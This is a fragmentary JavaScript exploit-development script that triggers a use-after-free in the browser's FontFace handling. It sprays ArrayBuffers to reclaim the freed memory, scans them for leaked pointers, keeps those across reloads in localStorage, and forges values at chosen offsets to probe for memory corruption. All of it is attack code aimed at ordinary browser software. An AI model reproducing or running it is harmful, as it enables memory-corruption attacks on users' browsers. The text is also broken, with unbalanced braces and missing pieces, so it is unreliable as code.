function qw(v,off){var s='';for(var i=7;i>=0;i--)s+=hex8(v[off+i]);return s;}

  4:{off:0x40,src:'T'},
  5:{off:0x48,src:'T'},
  6:{off:0x68,src:'T'},
  7:{off:0x50,src:'T'},
  8:{off:0x28,src:'T',nofree:true},
  9:{off:0x68,src:'I'}

var A=ARMS[arm]||null;
if(autoNext){
  // sequencing: no stored arm state -> prime first, then start at arm 1
  if(arm<0){
    if(!priorT){ emit('SEQ','prime -> store T, arms start next load');A=null;arm=0; }

  if(A&&A.src==='T'&&!priorT){ emit('SEQ','no T for arms — prime this load, retry arm next reload');A=null;arm=0; }
}
if(arm>9)A=ARMS[1];
if(A) emit('ARM',(function(){return 'off=0x'+A.off.toString(16)+' src='+A.src+' nofree='+(!!A.nofree);})());
// advance the cycle BEFORE the walk: one arm per load, strict. A killing
// arm dies and the restart loop advances to the next arm automatically.
if(autoNext&&arm>0){
  var skip=arm>=9?1:arm+1;
  try{localStorage.setItem('p685arm',String(skip));}catch(e){}
  emit('SEQ','next load = arm '+skip);

// Forge helper: write 8 bytes into every sprayed buffer at off
function forgeAll(map,off,val){
  for(var k=0;k<map.length;k++){
    var v=map[k].view;
    for(var b=0;b<8;b++) v[off+b]=(val>>(8*(7-b)))&0xFF;
  }
}
function hexToBytes(h){var out=[];for(var i=0;i<8;i++)out.push(parseInt(h.substr(i*2,2),16));return out;}

// ================================================================
// FontFace UAF trigger (single-arm, p680 recipe)

// ================================================================
var style,ff,fired=false,map=window.__p685map=[];

document.head.appendChild(style);
ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);
void ff.loaded;
alive.push(ff);

function doFree(){
  style.remove();
  try{document.fonts.delete(ff);}catch(e){}
  document.body.offsetHeight;
}
function doSpray(){
  map=window.__p685map=[];
  for(var k=0;k<16;k++){
    var ab=new ArrayBuffer(192);
    map.push({ab:ab,view:new Uint8Array(ab)});
  }
  return map;
}

Object.defineProperty(FontFace.prototype,'then',{
  configurable:true,
  get:function(){
    if(fired)return undefined;
    fired=true;
    if(!A || !A.nofree)doFree();

    try{document.fonts.check('1em s0');}catch(e){}
    return undefined;
  },

});

emit('TRIGGER','document.fonts.load');
document.fonts.load('1em f0, s0','AB').then(function(){
  emit('RESOLVED','promise ok');
},function(){emit('REJECTED','promise rejected');});

// ================================================================
// Scan 150ms later
// ================================================================
setTimeout(function(){
  var hit=-1,nzBest=0;
  for(var i=0;i<map.length;i++){
    var v=map[i].view,n=0;
    for(var j=0;j<192;j++)if(v[j]!==0)n++;

    emit('SCAN','clean-no-reclaim');

      for(var b=0;b<8;b++)before+=hex8((function(){var hx=(A.src==='T')?priorT:priorI;var bs=hexToBytes(hx);return bs[b];})());
      emit('SLOT','0x'+A.off.toString(16)+' now='+qw(v,A.off)+' forged='+before+' same='+(qw(v,A.off)===before));
      // also dump the 0x18-0x70 run to see survivor/overwritten cells
      var cells='';
      for(var o=0x18;o<=0x68;o+=8)cells+=o.toString(16)+':'+qw(v,o)+' ';
      emit('RUN',cells.trim());
    }
    // store T/impl for arms when this is a prime load
    if(!A){
      var t58=qw(v,0x58),i68=qw(v,0x68);
      try{localStorage.setItem('p685T',t58);localStorage.setItem('p685I',i68);}catch(e){}
      emit('STORED','T='+t58+' I='+i68);
    }
  }
  // liveness: force layout; if we beacon, the process survived the walk
  document.body.offsetHeight;
  emit('ALIVE','survived');
  flush();
  // advance the auto-cycle only for the prime load here (arm loads advanced
  // before the walk already); prime repeats until T is actually stored

  emit('DONE','arm='+arm);
